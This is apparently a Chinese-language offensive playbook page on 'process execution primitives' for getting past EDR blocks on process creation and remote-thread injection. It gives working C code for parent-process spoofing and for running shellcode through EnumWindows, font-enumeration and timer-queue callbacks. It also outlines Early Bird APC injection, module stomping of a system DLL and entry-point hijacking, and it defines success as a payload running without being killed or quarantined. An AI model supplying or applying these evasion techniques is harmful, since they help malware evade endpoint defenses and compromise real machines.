# Process Execution Primitives

当阻断发生在 **进程创建、父进程树、远程线程、命令行遥测** 时使用。目标不是“换一个 shellcode”，而是换执行原语。

成功标准：原先被拦的进程创建/代码执行现在发生，且原 Attack 模块的 payload 进入预期路径。

---

## 1. 不要默认的链

```text
cmd.exe / powershell.exe
CreateProcess
VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
```

现代 EDR 把这条链当高相关行为。按 observed blocker 换 primitive。

---

## 2. PPID spoof

让恶意进程挂在 explorer/sihost/Outlook 下，打断 `office → cmd → powershell` 进程树。

```c
STARTUPINFOEX si = { sizeof(si) };
SIZE_T size = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);

HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);
UpdateProcThreadAttribute(
    si.lpAttributeList, 0,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
    &hParent, sizeof(hParent), NULL, NULL);

CreateProcessW(
    L"C:\\Windows\\System32\\cmd.exe", cmdLine,
    NULL, NULL, FALSE,
    EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
    NULL, NULL, &si.StartupInfo, &pi);
```

条件：对目标父进程有 `PROCESS_CREATE_PROCESS`。不要对 SYSTEM 受保护进程硬 Open。成功：Process Explorer / `Get-CimInstance Win32_Process` 显示伪造父进程。

---

## 3. Callback 执行（避开显式 CreateThread）

CreateThread/CreateRemoteThread 是常见遥测点。用系统回调把 RIP 送到 payload：

```c
// EnumWindows
EnumWindows((WNDENUMPROC)payload, 0);

// EnumFontFamiliesEx
LOGFONTW lf = {0};
EnumFontFamiliesExW(GetDC(NULL), &lf, (FONTENUMPROC)payload, 0, 0);

// Timer
HANDLE hTimer = NULL;
CreateTimerQueueTimer(&hTimer, NULL, (WAITORTIMERCALLBACK)payload,
                      NULL, 0, 0, WT_EXECUTEINTIMERTHREAD);
```

callback 本身、内存属性和调用栈仍可被检测。这是换执行触发器，不是隐身。

---

## 4. Early Bird APC

```text
CreateProcess(CREATE_SUSPENDED)
→ 写入目标内存
→ QueueUserAPC 到主线程
→ ResumeThread
```

代码在主线程第一次进入 alertable 时跑，没有额外 remote thread。对部分 EDR 比 CRT 干净，对另一些仍是注入。

---

## 5. Module stomping / image-backed

不新分配 RWX，覆盖已加载合法模块的 `.text`：

```text
LoadLibrary("C:\\Windows\\System32\\cryptbase.dll")  // 选非关键、足够大的模块
→ VirtualProtect(.text, PAGE_READWRITE)
→ 写入 payload
→ VirtualProtect(.text, PAGE_EXECUTE_READ)
→ 从该模块地址执行（callback / 劫持入口，尽量不用 CreateRemoteThread）
```

不要踩 `ntdll`/`kernel32` 的关键页。模块完整性扫描仍可能告警。

---

## 6. Entry Point Hijacking

```text
CREATE_SUSPENDED
→ 定位目标 image 入口
→ 把入口改成 staging stub 或改写入口代码
→ ResumeThread
```

减少显式 remote-thread 证据。可行性取决于目标 image、loader 状态和 EDR。

---

## 7. 成功 / 失败

```text
SUCCESS:
- 目标进程/线程按预期执行 payload
- 原被拦动作不再被立刻 kill/quarantine

STILL BLOCKED:
- 换下一层：memory-execution / callstack / kernel
- 不要无脑加一层加密

CLEANUP:
- 结束测试进程
- 不要把 stomped 系统 DLL 留在长期进程里
```
